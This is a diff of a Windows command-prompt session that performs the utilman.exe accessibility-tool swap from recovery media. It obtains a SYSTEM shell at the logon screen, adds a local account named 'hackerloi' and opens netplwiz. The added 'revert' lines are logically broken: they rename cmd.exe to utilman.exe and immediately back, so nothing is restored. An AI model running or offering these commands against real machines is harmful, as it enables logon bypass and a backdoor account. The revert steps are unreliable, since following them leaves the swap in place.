@@ -15,8 +15,14 @@ X:\Windows\System32>ren utilman2.exe utilman.exe
 
 C:\Windows\system32>whoami
 nt authority\system
-
 C:\Windows\system32>net user hackerloi hackerloi /add
 The command completed successfully.
-
 C:\Windows\system32>netplwiz
+
+cd /d X:\Windows\System32
+rem check files and names first
+dir utilman.exe cmd.exe utilman2.exe
+rem if cmd.exe was renamed to utilman.exe and utilman2.exe exists, revert:
+ren cmd.exe utilman.exe
+ren utilman.exe cmd.exe
+
